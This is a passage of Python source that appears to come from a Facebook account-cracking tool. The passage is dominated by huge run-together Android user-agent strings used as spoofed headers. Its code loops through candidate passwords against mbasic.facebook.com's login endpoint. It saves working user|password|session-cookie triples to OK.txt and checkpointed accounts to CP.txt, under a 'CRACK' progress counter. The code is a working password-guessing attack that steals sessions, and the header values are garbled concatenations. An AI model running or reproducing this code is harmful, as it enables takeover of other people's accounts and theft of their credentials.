Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2038 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Reddit/Version 2022.35.1/Build 589034/Android 12 Mozilla/5.0 (Linux; Android 5.1.1; AFTM Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2204 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RI32.32-20-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UAYSEN/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 wp-android/20.6.1 Mozilla/5.0 (Linux; Android 12; SM-G970U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Zalo android/12100641 ZaloTheme/dark ZaloLanguage/vi Mozilla/5.0 (Linux; Android 12; SM-A426U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 13; Pixel 4 Build/TP1A.220905.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Onefootball/Android/14.42.1 Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A725F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G985F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19PG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Home Assistant/2022.9.1-2700 (Android 12; M2012K11AG) Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G780G; Android 12#G780GXXU3CVI1#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G998B; Android 12#G998BXXS5CVHI#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-19-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 EdgW/1.0 Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; 2109119DG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; AC2003 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 webexplorer/4 Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S901B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Doihue/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 appname/PLAYit appverc/20604027 appname/PLAYit appverc/20604027 Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M127F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; IN2023 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(50) Build/S1RFS32.27-25-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 GNews Android/2022089220",
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"sec-fetch-site": "same-origin",
					"sec-fetch-mode": "navigate",
					"sec-fetch-user": "?1",
					"sec-fetch-dest": "document",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
				hasil = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = cari, headers = header_post, allow_redirects = True)
				if "c_user" in ses.cookies.get_dict().keys():
					coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f"\r {H}*  --> {user}|{pw}|{coki}")
					ok.append(f"{user}|{pw}|{coki}")
					_wrt_ = "\n%s|%s|%s"%(user,pw,coki)
					open("OK.txt","a").write(_wrt_)
					break
				elif "checkpoint" in ses.cookies.get_dict().keys():
					print(f"\r {K}*  --> {user}|{pw}")
					cp.append(f"{user}|{pw}")
					_wrt_ = "\n%s|%s"%(user,pw)
					open("CP.txt","a").write(_wrt_)
					break
				else:
					continue
			loop +=1
		except requests.exceptions.ConnectionError:
			time.sleep(20)

	def mobile(self, user, pwx):
		global loop,ok,cp
		st = random.choice([M,K,H,U,P,O,H])
		ts = random.choice([H,K,H,U,P,O,H])
		sys.stdout.write("\r %s[%s>_{N}] %sCRACK : %s/%s [OK:%s][CP:%s]"%(st,ts,ts,loop,len(id),len(ok),len(cp)));sys.stdout.flush()
		for pw in pwx:
			try:
				ses = requests.Session()
				head = {
					"Host": "mbasic.facebook.com","sec-ch-ua-mobile": "?1",
					"upgrade-insecure-requests": "1",
					"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A715W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2065 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G715FN Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Pixel 3a Build/SP2A.220505.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Redmi Note 9S Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2038 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Reddit/Version 2022.35.1/Build 589034/Android 12 Mozilla/5.0 (Linux; Android 5.1.1; AFTM Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2204 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RI32.32-20-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UAYSEN/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 wp-android/20.6.1 Mozilla/5.0 (Linux; Android 12; SM-G970U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Zalo android/12100641 ZaloTheme/dark ZaloLanguage/vi Mozilla/5.0 (Linux; Android 12; SM-A426U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 13; Pixel 4 Build/TP1A.220905.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Onefootball/Android/14.42.1 Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A725F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G985F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG 